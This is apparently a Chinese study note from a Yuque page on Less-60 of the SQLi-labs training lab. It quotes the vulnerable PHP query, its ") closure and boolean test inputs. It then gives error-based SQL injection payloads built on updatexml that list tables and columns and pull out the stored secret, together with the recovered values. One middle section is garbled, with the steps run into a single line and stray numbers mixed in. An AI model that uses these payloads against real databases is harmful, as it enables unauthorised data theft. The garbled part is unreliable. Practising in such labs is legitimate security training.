---
title: less60
url: https://www.yuque.com/u29002979/ep2zrx/qukek98oikfag9kv
---

```bash
$id = '("'.$id.'")';
// Querry DB to get the correct output
$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";
```

闭合方式")

`?id=1") and 1=1--+`
`?id=1") and 1=2--+`

<a name="OK6A0"></a>

# 11 1爆破数据表2?id=-1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +3数据表：codgf1m6wa4​5爆破字段名6?id=-1 and updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='codgf1m6wa'),0x7e),1) -- +7字段：secret_JGAS8​9获取密码10?id=-1 and updatexml(1,concat(0x7e,(select secret_JGAS from codgf1m6wa),0x7e),1) -- +11密码：JvKSBvmuHkWi8od1IZnHs94ebash

```bash
爆破数据表
?id=-1") and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +
数据表：kpt3mvazyg

爆破字段名
?id=-1") and updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='kpt3mvazyg'),0x7e),1) -- +
字段：secret_NRFF

获取密码
?id=-1") and updatexml(1,concat(0x7e,(select secret_NRFF from kpt3mvazyg),0x7e),1) -- +
密码：vI7A4DnWuwDoNK8NMXKQyYHm
```
